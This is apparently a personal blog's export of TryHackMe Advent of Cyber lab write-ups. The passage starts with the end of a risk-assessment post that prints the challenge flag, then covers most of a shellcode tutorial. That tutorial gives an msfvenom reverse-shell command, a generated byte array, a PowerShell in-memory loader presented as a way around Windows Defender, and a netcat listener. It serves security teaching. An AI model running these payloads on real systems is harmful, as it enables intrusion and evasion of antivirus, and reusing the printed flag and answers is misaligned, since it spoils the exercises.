<p>The last step to performing a risk assessment is to decide what to do with the risks that were found. We can start by performing some calculations on the risk itself. The simplest calculation takes the likelihood of the risk and multiplies it with the impact of the risk to get a score.   <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730225302939.png" alt="Tagging an owner for the risk" />Some risk registers make use of more advanced rating systems such as DREAD. Assigning scores to the risks helps organisations prioritise which risks should be remediated first. \n</p>

<p>While you may think the simplest answer is to secure the system so there is no risk, in real life, it isn’t that simple. Implementing more security costs more money, and it doesn’t help if we spend more money on security than what we risk losing if we leave open the risk.</p>

<p>In this last step, we decide who owns the risks that were identified. These team members are then responsible for performing an additional investigation into what the cost would be to close the risk vs what we could lose if the risk is realised. In cases where the cost of security is lower, we can <strong>mitigate</strong> the risk with more security controls. However, were it is higher, we can <strong>accept</strong> the risk. Accepted risks should always be documented and reviewed periodically to ensure that the cost has not changed.</p>

<h2 id="internal-and-third-party-risk-assessments">Internal and Third-Party Risk Assessments</h2>

<p>Risk assessments are not just done internally in an organisation, but can also be used to assess the risk that a third party may hold to our organisation. Today, it is very common to make use of third parties to outsource key functions of your business. For example, a small organisation may outsource its financial division to a large auditing firm, or a large organisation may outsource the development of some of its applications to a software engineering firm. However, this changes the risk as a compromise of the third party, where we may not have full control over their security, could still result in a compromise of our data or sensitive assets. As such, we need to consider the risk the third party poses to us.</p>

<p><strong>Why Do Companies Do Internal Risk Assessments?</strong></p>

<p>Internal risk assessments help companies understand the risks they have within their own walls. It’s like taking a good look around your house to check if there are any leaks or broken windows.</p>

<p>For example, if a company finds that its software is outdated, it can prioritise updating it to prevent potential attacks. Internal risk assessments help:</p>

<ul>
  <li>Identify weak spots in security.</li>
  <li>Direct resources to the most important areas.</li>
  <li>Stay compliant with security rules and regulations. \n</li>
</ul>

<p><strong>Why Do Companies Do Risk Assessments of Third Parties?</strong></p>

<p>Companies don’t just assess themselves—they also need to evaluate the risks that come from working with other companies, like vendors, suppliers, or partners. This is called a third-party risk assessment, and it’s important because one weak link in the chain can affect everyone.</p>

<p>Let’s make it simple: McSkidy and Glitch want to make sure that whichever eDiscovery company they choose won’t leak or lose sensitive data. So, they will be reviewing if these companies:</p>

<ul>
  <li>Have good security measures to keep data safe.</li>
  <li>Follow data protection rules.</li>
  <li>Align with the security standards that McSkidy and Glitch have in place. \n</li>
</ul>

<p>By doing a third-party risk assessment, McSkidy and Glitch are reducing potential supply chain risks - making sure the investigation doesn’t run into trouble because of a weak security link in the chain. In order to do this, McSkidy has to create a risk assessment that can be sent to the potential third parties. Based on the answers provided by the third parties, McSkidy can then make an informed decision on which third party would be best!</p>

<h2 id="procuring-a-partner">Procuring a Partner</h2>

<p>Let’s put this knowledge to the test! Let’s start the static site attached to this task by pressing the <strong>View Site</strong> button below:</p>

<p>View Site</p>

<p>You will have to assess the level of risk that each of the vendors pose. We sent a questionnaire to each potential third-party and have received their answers. Using these answers, you will have to add new risks to the risk register, which will give an overall risk score for each third-party. Once done, we can choose the third-party that has the lowest risk score. \n</p>

<p>Answer the questions below</p>

<p>What does GRC stand for?</p>

<p>Governance, Risk, and Compliance</p>

<p>What is the flag you receive after performing the risk assessment?</p>

<p>THM{R15K_M4N4G3D}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/r/room/seriskmanagement">Risk Management</a> room.</p>]]></content><author><name>Michael</name></author><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/day9Header.png" /><media:content medium="image" url="http://localhost:4000/day9Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Advent of Cyber - Day 8</title><link href="http://localhost:4000/Day8" rel="alternate" type="text/html" title="TryHackMe Advent of Cyber - Day 8" /><published>2024-12-08T00:00:00-05:00</published><updated>2024-12-08T00:00:00-05:00</updated><id>http://localhost:4000/Day8</id><content type="html" xml:base="http://localhost:4000/Day8"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730451713924.svg" alt="Task banner for day 8" /></p>

<p><em>Glitch the hacker, clever yet distrusted,</em></p>

<p><em>Wrote a script with skills finely adjusted.</em></p>

<p><em>Shellcode magic to his home it would send,</em></p>

<p><em>Where secrets of Wareville he’d carefully penned.</em></p>

<p>\n</p>

<p>Glitch, a skilled but mistrusted hacker, was prepping for a tech conference. He was eager to share his shellcode script that remotely accessed his home system. As he worked, he noticed Mayor Malware’s henchmen lurking nearby.</p>

<p><em>“They’re wasting their time. I don’t have anything they’d want,”</em> Glitch chuckled.</p>

<p>He didn’t realise that hidden in his home system was something they desperately sought—a research paper he wrote on Wareville’s defences, a treasure Mayor Malware was eager to obtain.</p>

<h2 id="learning-objectives">Learning Objectives</h2>

<ul>
  <li>Grasp the fundamentals of writing shellcode</li>
  <li>Generate shellcode for reverse shells</li>
  <li>Executing shellcode with PowerShell</li>
</ul>

<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>

<p>Before moving forward, review the questions in the connection card shown below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731050107820.png" alt="Task connection card." /></p>

<p>Click on the green <code class="language-plaintext highlighter-rouge">Start Machine</code> button below to start the virtual machine in split-screen view. If the VM is not visible, use the blue <code class="language-plaintext highlighter-rouge">Show Split View</code> button at the top of the page. Alternatively, you can connect to the VM via Remote Desktop (RDP) using the credentials below:</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM key" /></p>

<table>
  <thead>
    <tr>
      <th><strong>Username</strong></th>
      <th>glitch</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Password</strong></td>
      <td>Passw0rd</td>
    </tr>
    <tr>
      <td><strong>IP</strong></td>
      <td>MACHINE_IP</td>
    </tr>
  </tbody>
</table>

<p>Aside from the VM, you must also start the AttackBox for this task. Click on the <code class="language-plaintext highlighter-rouge">Start AttackBox</code> button located above this page.</p>

<h2 id="essential-terminologies">Essential Terminologies</h2>

<p><em>A reverse shell to his system so tight,</em></p>

<p><em>He planned to showcase at the tech conference night.</em></p>

<p><em>Eager to share how his shellcode could impress,</em></p>

<p><em>He aimed to enlighten, to teach and progress.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p>Before we start, review some important concepts to help you better understand the upcoming content. Shellcode is an advanced topic, but knowing these foundational ideas will make the rest of the material more accessible and engaging.</p>

<ul>
  <li><strong>Shellcode</strong>: A piece of code usually used by malicious actors during exploits like buffer overflow attacks to inject commands into a vulnerable system, often leading to executing arbitrary commands or giving attackers control over a compromised machine. Shellcode is typically written in assembly language and delivered through various techniques, depending on the exploited vulnerability.</li>
  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375094892.png" alt="anti-virus shield depicting protection" /><strong>PowerShell</strong>: A powerful scripting language and command-line shell built into Windows for task automation and configuration management. It allows users to interact with system components and is widely used by administrators for legitimate purposes. However, attackers often use PowerShell as a post-exploitation tool because of its deep access to system resources and ability to run scripts directly in memory, avoiding disk-based detection mechanisms.</li>
  <li><strong>Windows Defender</strong>: A built-in security feature that detects and prevents malicious scripts, including PowerShell-based attacks, by scanning code at runtime. Common bypass methods for evading Defender include obfuscating scripts to disguise malicious content, making it harder for the software to recognise known patterns. Another technique is a reflective injection, where malicious code is loaded directly into memory, avoiding detection by signature-based defences. We will cover the latter one in this task. \n</li>
  <li><strong>Windows API</strong>: The Windows Application Programming Interface (API) allows programs to interact with the underlying operating system, giving them access to essential system-level functions such as memory management, file operations, and networking. It serves as a bridge between the application and the operating system, enabling efficient resource handling. The Windows API is crucial because many exploitation techniques and malware rely on it to manipulate processes, allocate memory, and execute shellcodes. Common Windows API functions frequently used by malicious actors include <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, <code class="language-plaintext highlighter-rouge">CreateThread</code>, <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>, which we will also use in this task for exploitation.</li>
  <li><strong>Accessing Windows API through PowerShell Reflection</strong>: Windows API via PowerShell Reflection is an advanced technique that enables dynamic interaction with the Windows API from PowerShell. Instead of relying on precompiled binaries, PowerShell Reflection allows attackers to call Windows API functions directly at runtime. This will enable them to manipulate low-level system processes, making it a primary tool for bypassing security mechanisms, interacting with the operating system, and executing code stealthily.</li>
  <li><strong>Reverse shell</strong>: A type of connection in which the target (the machine you’re trying to hack) initiates a connection back to your attacking machine (in this case, your machine will be the AttackBox).</li>
  <li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1728375153734.png" alt="process flow of reverse shell" /></li>
</ul>

<h2 id="generating-shellcode">Generating Shellcode</h2>

<p><em>But Mayor Malware’s minions, sneaky and sly,</em></p>

<p><em>Found his script and gave it a try.</em></p>

<p><em>They tampered the code, changed port and IP,</em></p>

<p><em>Twisted his work with a sinister glee.</em></p>

<ul>
  <li>\n *</li>
</ul>

<p>Let’s learn how to generate a shellcode to see what it looks like. To do this, we will use a tool called <code class="language-plaintext highlighter-rouge">msfvenom</code>to get a reverse shell. \n</p>

<p>In the AttackBox, open the terminal and enter the command <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell</code> that will generate the shellcode. The output will look like the following.  You will require to replace the <code class="language-plaintext highlighter-rouge">ATTACKBOX_IP</code> with the IP of the AttackBox.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="nx">ATTACKBOX_IP</span> <span class="nx">LPORT</span><span class="o">=</span><span class="mi">1111</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">powershell</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">platform</span> <span class="nx">was</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">choosing</span> <span class="nx">Msf</span><span class="p">::</span><span class="nx">Module</span><span class="p">::</span><span class="nx">Platform</span><span class="p">::</span><span class="nx">Windows</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="nx">No</span> <span class="nx">arch</span> <span class="nx">selected</span><span class="p">,</span> <span class="nx">selecting</span> <span class="nx">arch</span><span class="p">:</span> <span class="nx">x64</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">payload</span>
<span class="nx">No</span> <span class="nx">encoder</span> <span class="nx">specified</span><span class="p">,</span> <span class="nx">outputting</span> <span class="nx">raw</span> <span class="nx">payload</span>
<span class="nx">Payload</span> <span class="nx">size</span><span class="p">:</span> <span class="mi">460</span> <span class="nx">bytes</span>
<span class="nx">Final</span> <span class="nx">size</span> <span class="k">of</span> <span class="nx">powershell</span> <span class="nx">file</span><span class="p">:</span> <span class="mi">2259</span> <span class="nx">bytes</span>
<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="mh">0xfc</span><span class="p">,</span><span class="mh">0xe8</span><span class="p">,</span><span class="mh">0x82</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe5</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0x64</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span>
<span class="mh">0x30</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0xf</span><span class="p">,</span><span class="mh">0xb7</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x26</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
<span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x2</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0xe2</span><span class="p">,</span><span class="mh">0xf2</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span>
<span class="mh">0x10</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4a</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd1</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span>
<span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="mh">0xe3</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x34</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd6</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xac</span><span class="p">,</span>
<span class="mh">0xc1</span><span class="p">,</span><span class="mh">0xcf</span><span class="p">,</span><span class="mh">0xd</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x3</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0xf8</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x7d</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span>
<span class="mh">0xe4</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="mh">0x4b</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span>
<span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span>
<span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0xeb</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x1</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x85</span><span class="p">,</span><span class="mh">0xb2</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span>
<span class="mh">0x0</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x87</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">,</span><span class="mh">0xb5</span><span class="p">,</span><span class="mh">0xa2</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span>
<span class="mh">0xa6</span><span class="p">,</span><span class="mh">0x95</span><span class="p">,</span><span class="mh">0xbd</span><span class="p">,</span><span class="mh">0x9d</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">,</span><span class="mh">0x6</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0xa</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="mh">0xfb</span><span class="p">,</span><span class="mh">0xe0</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x5</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span>
<span class="mh">0x47</span><span class="p">,</span><span class="mh">0x13</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd5</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x6c</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x2e</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x78</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x0</span>
</code></pre></div></div>

<p>The above command generates a piece of shellcode using <code class="language-plaintext highlighter-rouge">msfvenom</code>. Here’s what each part means:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-p windows/x64/shell_reverse_tcp</code>: The <code class="language-plaintext highlighter-rouge">-p</code> flag tells <code class="language-plaintext highlighter-rouge">msfvenom</code> what type of payload to create. <code class="language-plaintext highlighter-rouge">windows/x64/shell_reverse_tcp</code> specifies that we want a reverse shell for a Windows machine.</li>
  <li><code class="language-plaintext highlighter-rouge">LHOST=ATTACKBOX_IP</code>: This is the IP address of the AttackBox. It tells the reverse shell where to connect back to.</li>
  <li><code class="language-plaintext highlighter-rouge">LPORT=1111</code>: This is the port number on your machine that will listen for the reverse shell connection. When the target connects back to you, it will use this port (<code class="language-plaintext highlighter-rouge">1111</code> in this example). You can choose any available port, but it needs to match with what your listener is set to.</li>
  <li><code class="language-plaintext highlighter-rouge">-f powershell</code>: This specifies the format for the output. In this case, we want the payload to be in PowerShell format so it can be executed as a script on a Windows machine. \n</li>
</ul>

<p><strong>Where Is the Actual Shellcode</strong></p>

<p>The actual shellcode in the output above is the hex-encoded byte array, which starts with <code class="language-plaintext highlighter-rouge">0xfc, 0xe8, 0x82</code>, and so on. The hexadecimal numbers represent the instructions set on the target machine. Computers understand binary (1s and 0s), but hex numbers are just a more human-readable version. So, instead of seeing long strings of 1s and 0s, you see something like <code class="language-plaintext highlighter-rouge">0xfc</code>instead. \n</p>

<p>We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">$VrtAlloc</span> <span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$VrtAlloc</span>

<span class="nx">$WaitFor</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="dl">"</span><span class="s2">, SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
</span><span class="dl">"</span><span class="p">@</span>

<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$WaitFor</span>

<span class="nx">$CrtThread</span><span class="o">=</span> <span class="p">@</span><span class="dl">"</span><span class="s2">
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport(</span><span class="dl">"</span><span class="nx">kernel32</span><span class="dl">"</span><span class="s2">, CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

}
</span><span class="dl">"</span><span class="p">@</span>
<span class="nx">Add</span><span class="o">-</span><span class="nx">Type</span> <span class="nx">$CrtThread</span>

<span class="p">[</span><span class="nx">Byte</span><span class="p">[]]</span> <span class="nx">$buf</span> <span class="o">=</span> <span class="nx">SHELLCODE_PLACEHOLDER</span>
<span class="p">[</span><span class="nx">IntPtr</span><span class="p">]</span><span class="nx">$addr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">VrtAlloc</span><span class="p">]::</span><span class="nc">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
<span class="p">[</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]::</span><span class="nc">Copy</span><span class="p">(</span><span class="nx">$buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="nx">$buf</span><span class="p">.</span><span class="nx">Length</span><span class="p">)</span>
<span class="nx">$thandle</span> <span class="o">=</span> <span class="p">[</span><span class="nx">CrtThread</span><span class="p">]::</span><span class="nc">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="p">[</span><span class="nx">WaitFor</span><span class="p">]::</span><span class="nc">WaitForSingleObject</span><span class="p">(</span><span class="nx">$thandle</span><span class="p">,</span> <span class="p">[</span><span class="nx">uint32</span><span class="p">]</span><span class="dl">"</span><span class="s2">0xFFFFFFFF</span><span class="dl">"</span><span class="p">)</span>
</code></pre></div></div>

<p><em>Phew!</em> That’s a lot of code. But don’t stress. We’ll break down what it does step by step.</p>

<p>If you’re new to cyber security, memorising these functions is unnecessary. Most penetration testers use pre-made or automated tools to run shellcode, so you don’t have to know every technical detail to complete the job. No need to worry! \n</p>

<p><strong>Explanation of the Code</strong></p>

<p>The script starts by defining a few C# classes. These classes use the <code class="language-plaintext highlighter-rouge">DllImport</code> attribute to load specific functions from the <code class="language-plaintext highlighter-rouge">kernel32</code>DLL, which is part of the Windows API. \n</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">VirtualAlloc</code>: This function allocates memory in the process’s address space. It’s commonly used in scenarios like this to prepare memory for storing and executing shellcode.</li>
  <li><code class="language-plaintext highlighter-rouge">CreateThread</code>: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.</li>
  <li><code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.</li>
</ul>

<p>These classes are then added to PowerShell using the <code class="language-plaintext highlighter-rouge">Add-Type</code> command, allowing PowerShell to use these functions.</p>

<p><strong>Storing the Shellcode in a Byte Array</strong></p>

<p>Next, the script stores the shellcode in the <code class="language-plaintext highlighter-rouge">$buf</code> variable, a byte array. In the example above, <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> is just there to show where you would insert the actual shellcode earlier generated through <code class="language-plaintext highlighter-rouge">msfvenom</code>. Usually, you’d replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.</p>

<p><strong>Allocating Memory for the Shellcode</strong></p>

<p>The <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">0</code> for the memory address, meaning that Windows will decide where to allocate the memory.</li>
  <li><code class="language-plaintext highlighter-rouge">$size</code> for the size of the memory block, which is determined by the length of the shellcode.</li>
  <li><code class="language-plaintext highlighter-rouge">0x3000</code> for the allocation type, which tells Windows to reserve and commit the memory.</li>
  <li><code class="language-plaintext highlighter-rouge">0x40</code> for memory protection, the memory is readable and executable (necessary for executing shellcode).</li>
</ul>

<p>After memory is allocated, the <code class="language-plaintext highlighter-rouge">Marshal.Copy</code> function copies the shellcode from the <code class="language-plaintext highlighter-rouge">$buf</code> array into the allocated memory address (<code class="language-plaintext highlighter-rouge">$addr</code>), preparing it for execution.</p>

<p><strong>Executing the Shellcode and Waiting for Completion</strong></p>

<p>Once the shellcode is stored in memory, the script calls the <code class="language-plaintext highlighter-rouge">CreateThread</code> function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (<code class="language-plaintext highlighter-rouge">$addr</code>). The script then uses the <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.</p>

<h2 id="time-for-some-action---executing-the-shellcode">Time for Some Action - Executing the Shellcode</h2>

<p>On the AttackBox, execute the command <code class="language-plaintext highlighter-rouge">nc -nvlp 1111</code> to start a listener on port <code class="language-plaintext highlighter-rouge">1111</code> and wait for an incoming connection. This command opens port <code class="language-plaintext highlighter-rouge">1111</code> and listens for connections, allowing the AttackBox to receive data once a connection is made.</p>

<p>AttackBox Terminal</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nx">root</span><span class="p">@</span><span class="nd">attackbox</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">nvlp</span> <span class="mi">1111</span>
<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1111</span><span class="p">)</span>
</code></pre></div></div>

<p>On the AttackBox, begin by navigating to the Desktop. Right-click on the <code class="language-plaintext highlighter-rouge">Desktop</code>, select <code class="language-plaintext highlighter-rouge">Create Document</code>, and then choose <code class="language-plaintext highlighter-rouge">Empty File</code>. Open this new file and paste the previously provided PowerShell script code into it. Look for the part labelled <code class="language-plaintext highlighter-rouge">SHELLCODE_PLACEHOLDER</code> and replace it with the shell code we previously created with <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>

